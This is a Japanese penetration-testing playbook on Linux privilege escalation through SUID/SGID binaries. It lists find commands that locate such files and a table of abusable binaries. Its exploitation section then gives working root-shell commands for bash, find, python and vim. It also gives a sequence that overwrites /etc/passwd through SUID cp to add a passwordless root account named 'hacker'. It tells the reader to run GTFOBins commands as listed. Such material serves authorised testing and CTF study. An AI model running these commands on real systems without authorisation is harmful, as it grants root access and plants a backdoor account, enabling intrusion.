# SUID / SGID バイナリによる権限昇格

## 概要

SUID（Set User ID）が設定されたバイナリは、実行時にファイルの所有者（通常 root）の権限で動作する。非特権ユーザーが SUID root バイナリを実行することで root 相当の操作が可能になる。

---

## 着火条件

`find / -perm -4000 -type f 2>/dev/null` の出力に、GTFOBins に掲載されているバイナリが含まれている場合。

---

## 確認コマンド

```bash
# SUID バイナリの検索
find / -perm -4000 -type f 2>/dev/null

# SGID バイナリの検索
find / -perm -2000 -type f 2>/dev/null

# SUID + SGID 両方
find / -perm /6000 -type f 2>/dev/null
```

---

## 観点・着眼点

**標準バイナリに SUID が設定されていないか確認する：**

以下のバイナリに SUID が設定されていれば GTFOBins で悪用方法を確認する。

| バイナリ | 悪用の難易度 |
|---------|------------|
| `/bin/bash` | 非常に簡単 |
| `python` / `python3` | 簡単 |
| `perl` / `ruby` | 簡単 |
| `find` | 簡単 |
| `vim` / `vi` | 簡単 |
| `nmap`（古いバージョン） | 可能 |
| `cp` / `mv` | `/etc/passwd` の書き換えで可能 |
| `wget` | `/etc/passwd` の上書きで可能 |

**非標準バイナリ（カスタムアプリケーション）にも注目：**
一般的でないパスにある SUID バイナリは、コードの脆弱性や PATH インジェクションで悪用できる可能性がある。

---

## 悪用手順

### bash に SUID が設定されている場合

```bash
/bin/bash -p
# -p オプションで特権モード（実効UIDを保持）でシェルを起動
```

### find に SUID が設定されている場合

```bash
find . -exec /bin/bash -p \; -quit
# または
find / -name "." -exec /bin/bash -p \; -quit
```

### python に SUID が設定されている場合

```bash
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### vim に SUID が設定されている場合

```bash
vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
```

### cp / mv で /etc/passwd を書き換える場合

```bash
# 現在の /etc/passwd をコピー
cp /etc/passwd /tmp/passwd.bak

# パスワードなしのrootエントリを追加
echo 'hacker::0:0:root:/root:/bin/bash' >> /tmp/passwd.bak

# SUID cp で上書き
cp /tmp/passwd.bak /etc/passwd

# 作成したアカウントでログイン
su hacker
```

---

## GTFOBins の使い方

1. https://gtfobins.github.io/ にアクセス
2. バイナリ名で検索（例: `find`）
3. 「SUID」タブを選択
4. 記載されているコマンドをそのまま実行

---

## 注意点・落とし穴

- SUID が設定されていても、バイナリが特権操作をしない実装であれば悪用できない場合がある
- `-p` オプションなしで bash を実行すると、シェルが実効UID をリセットしてしまう
- NFS マウントされたファイルシステムでは `nosuid` オプションで SUID が無効化されることがある

---

## 関連技術
- GTFOBins: https://gtfobins.github.io/
- Capabilities も確認 → `Capabilities.md`
